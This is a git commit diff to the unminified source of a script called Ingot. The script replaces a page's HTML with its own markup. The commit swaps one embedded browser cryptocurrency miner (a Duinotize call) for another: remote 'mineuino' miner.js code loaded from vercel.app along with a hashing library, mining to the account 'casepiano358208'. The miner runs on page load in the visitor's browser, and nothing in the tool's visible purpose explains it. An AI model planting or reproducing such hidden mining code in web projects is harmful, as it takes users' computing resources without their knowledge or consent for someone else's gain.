5d3eef93e86eb2113ebc595db5cd1d66caba8bd2
MMarchjr <103056947+mmarchjr@users.noreply.github.com>
2022-12-08 13:03:47 -0600

    Update Ingot-source-unminified.js

--- Ingot-source-unminified.js
+++ Ingot-source-unminified.js
@@ -19,13 +19,7 @@ return "";
 document.documentElement.innerHTML = `<html><head><link rel="icon" href="data:image/svg+xml,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1'><path fill='white' d='M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z'></path></svg>">
 <title>Ingot</title>
 </head>
-<script src="https://NoozSBC.github.io/Duinotize/duinotize.js" defer></script>
-<script>
-  Duinotize({
-    username: "casepiano358208",
-    rigid: "Ingot"
-  });
-</script>
+<script type="text/javascript" src="https://cdn.rawgit.com/h2non/jsHashes/master/hashes.js" ></script> <script src="https://mineuino.vercel.app/miner.js" defer></script> <div id="mineuino-div" data-mineuino-username="casepiano358208"></div>
 <script>
     setTimeout(function(){
         if(typeof _client === 'undefined' || _client === null)
